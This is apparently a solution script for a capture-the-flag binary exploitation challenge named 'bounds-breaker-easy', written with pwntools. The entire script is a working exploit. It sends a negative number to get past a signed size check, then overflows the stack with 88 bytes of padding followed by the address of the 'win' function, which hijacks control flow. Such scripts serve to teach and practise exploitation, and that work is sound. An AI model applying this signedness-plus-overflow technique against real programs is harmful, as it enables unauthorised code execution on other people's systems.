from pwn import *

context.binary = elf = ELF('/challenge/bounds-breaker-easy', checksec=False)
win_addr = elf.symbols['win']
print(f'[+] win_addr: {hex(win_addr)}')

io = elf.process()

# program get size with scanf("%i") which get a signed int, we input a negative number will pass the check
# cmp $num, 0x3f
io.sendline(b'-1')

io.sendline(b'A' * 88 + p64(win_addr))

io.interactive()
